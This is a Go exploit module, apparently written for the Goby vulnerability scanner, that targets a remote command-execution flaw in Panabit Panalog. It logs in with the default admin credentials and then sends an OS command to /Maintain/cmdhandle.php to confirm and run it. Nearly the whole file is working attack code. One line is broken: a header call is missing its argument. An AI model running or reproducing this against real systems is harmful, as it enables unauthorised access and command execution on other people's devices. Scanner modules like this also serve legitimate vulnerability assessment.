package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
  "Name": "Panabit Panalog cmdhandle.php backstage RCE",
  "Description": "Panabit Panalog cmdhandle.php backstage RCE",
  "Product": "Panabit Panalog",
  "Homepage": "https://www.panabit.com/",
  "DisclosureDate": "2021-05-18",
  "Author": "PeiQi",
  "GobyQuery": "app=\"Panabit-Panalog\"",
  "Level": "3",
  "Impact": "RCE",
  "Recommendation": "",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "Cmd",
      "type": "input",
      "value": "id"
    }
  ],
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "data": "",
        "data_type": "text",
        "follow_redirect": true,
        "method": "GET",
        "uri": "/"
      },
      "ResponseTest": {
        "checks": [
          {
            "bz": "",
            "operation": "==",
            "type": "item",
            "value": "200",
            "variable": "$code"
          }
        ],
        "operation": "AND",
        "type": "group"
      }
    }
  ],
  "ExploitSteps": null,
  "Tags": ["RCE"],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": ["Panabit Panalog"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		    cookie := "PHPSESSID=111111111111111111111test"
		    uri_1 := "/login.php"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = false
			cfg_1.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg_1.Header.Store("Cookie", cookie)
			cfg_1.Data = "user=admin&mypass=panabit&useldap=0"
			if resp, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
        		if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "yes") {
        		    uri_2 := "/Maintain/cmdhandle.php"
        			cfg_2 := httpclient.NewPostRequestConfig(uri_2)
        			cfg_2.VerifyTls = false
        			cfg_2.FollowRedirect = false
        			cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
        			cfg_2.Header.Store("Cookie", )
        			cfg_2.Data = "cmd=id"
        			if resp, err := httpclient.DoHttpRequest(u, cfg_2); err == nil {
        			    return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "uid")
        			}
        		}
        	}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cookie := "PHPSESSID=111111111111111111111test"
		    uri_1 := "/login.php"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = false
			cfg_1.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg_1.Header.Store("Cookie", cookie)
			cfg_1.Data = "user=admin&mypass=panabit&useldap=0"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
        		if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "yes") {
        		    uri_2 := "/Maintain/cmdhandle.php"
        			cfg_2 := httpclient.NewPostRequestConfig(uri_2)
        			cfg_2.VerifyTls = false
        			cfg_2.FollowRedirect = false
        			cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
        			cfg_2.Header.Store("Cookie", )
        			cfg_2.Data = "cmd=id"
        			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_2); err == nil {
        			    expResult.Output = resp.Utf8Html
            		    expResult.Success = true
        			}
        		}
        	}
			return expResult
		},
	))
}